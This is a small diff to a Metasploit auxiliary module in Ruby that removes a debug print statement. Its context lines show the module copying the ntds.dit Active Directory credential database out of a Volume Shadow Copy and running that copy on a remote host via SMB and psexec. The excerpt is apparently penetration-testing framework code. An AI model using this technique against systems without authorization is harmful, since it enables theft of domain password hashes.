@@ -151,7 +151,6 @@ class Metasploit3 < Msf::Auxiliary
 		begin 
 			# Try to copy ntds.dit from VSC
 			ntdspath = vscpath.to_s + "\\WINDOWS\\NTDS\\ntds.dit"
-			puts ntdspath
 			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
